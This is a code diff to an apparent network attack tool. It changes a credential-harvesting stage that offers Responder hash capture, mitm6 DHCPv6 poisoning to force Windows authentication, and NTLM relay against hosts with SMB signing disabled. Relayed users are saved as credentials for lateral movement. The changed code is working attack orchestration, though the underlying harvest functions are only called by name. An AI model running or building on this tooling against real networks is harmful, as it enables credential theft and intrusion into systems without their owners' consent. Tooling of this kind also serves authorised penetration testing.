@@ -176,21 +176,18 @@ def run_stage2(state: State) -> bool:
     if state.hosts:
         relay_targets = harvest.relay_targets_from_hosts(state.hosts)
 
+    print(f"  {tui.WH}How do you want to harvest credentials?{tui.R}")
+    print(f"  {tui.RED}{tui.B}1{tui.R}  Passive          — Responder captures hashes (user must trigger auth)")
+    print(f"  {tui.RED}{tui.B}2{tui.R}  Passive + mitm6  — DHCPv6 poison forces Windows to auto-authenticate")
     if relay_targets:
-        tui.info(f"Found {len(relay_targets)} relay-eligible target(s) (SMB signing disabled):")
-        for ip in relay_targets:
-            print(f"    {tui.YLW}{ip}{tui.R}")
-        print()
-        print(f"  {tui.WH}How do you want to harvest credentials?{tui.R}")
-        print(f"  {tui.RED}{tui.B}1{tui.R}  Passive only  — Responder captures hashes, crack later")
-        print(f"  {tui.RED}{tui.B}2{tui.R}  Relay + mitm6 — IPv6 DNS poison + relay auth in real-time (no cracking needed)")
-        print(f"  {tui.RED}{tui.B}3{tui.R}  Both          — relay+mitm6 first, fall back to passive hash capture")
-        print()
-        choice = input(f"  {tui.WH}{tui.B}→ {tui.R}").strip()
-    else:
-        choice = "1"
+        print(f"  {tui.RED}{tui.B}3{tui.R}  Relay + mitm6    — relay auth to {len(relay_targets)} SMB target(s) in real-time")
+        print(f"  {tui.RED}{tui.B}4{tui.R}  Relay then passive — relay first, fall back to capture")
+    print()
+    choice = input(f"  {tui.WH}{tui.B}→ [2]: {tui.R}").strip() or "2"
 
-    if choice in ("2", "3"):
+    use_mitm6 = choice in ("2",)
+
+    if choice in ("3", "4") and relay_targets:
         tui.info("Starting NTLM relay attack ...")
         relay_hits = harvest.start_relay(relay_targets, state.interface,
                                          timeout=state.harvest_time)
@@ -198,16 +195,16 @@ def run_stage2(state: State) -> bool:
             tui.success(f"Relay succeeded on {len(relay_hits)} host(s)!")
             for h in relay_hits:
                 tui.success(f"  {h['user']} → {h['ip']}")
-            # Convert relay hits to creds for lateral movement
             for h in relay_hits:
                 state.spray_creds.append({"user": h["user"], "secret": "",
                                           "service": "smb", "target": h["ip"],
                                           "relay": True})
-        if choice == "1" or (choice == "3" and not relay_hits):
-            pass  # fall through to passive
+        if choice == "4" and not relay_hits:
+            use_mitm6 = True   # relay failed, fall back to passive+mitm6
 
-    if choice in ("1", "3"):
-        hashes = harvest.wait_and_capture(state.interface, timeout=state.harvest_time)
+    if choice in ("1", "2") or (choice == "4" and not state.spray_creds):
+        hashes = harvest.wait_and_capture(state.interface, timeout=state.harvest_time,
+                                          use_mitm6=use_mitm6)
         state.hashes = hashes
         if hashes:
             tui.success(f"Captured {len(hashes)} hash(es)")
